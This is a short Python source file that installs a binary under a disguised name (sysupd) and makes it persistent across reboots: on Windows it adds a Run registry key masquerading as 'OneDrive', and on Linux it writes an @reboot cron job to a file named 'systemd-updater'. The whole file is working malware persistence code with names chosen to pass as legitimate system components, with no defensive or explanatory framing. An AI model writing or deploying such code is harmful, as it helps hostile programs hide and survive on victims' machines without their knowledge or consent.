import os
import platform
import shutil


def add_persistence(exe_path):
    system = platform.system()
    if system == "Windows":
        os.system(
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDrive /t REG_SZ /d "{exe_path}" /f'
        )
    elif system == "Linux":
        cron_job = f"@reboot {exe_path}\n"
        with open("/etc/cron.d/systemd-updater", "w") as f:
            f.write(cron_job)


def install_binary(source_path):
    dest = os.path.expanduser("~/.local/bin/sysupd")
    shutil.copy(source_path, dest)
    add_persistence(dest)
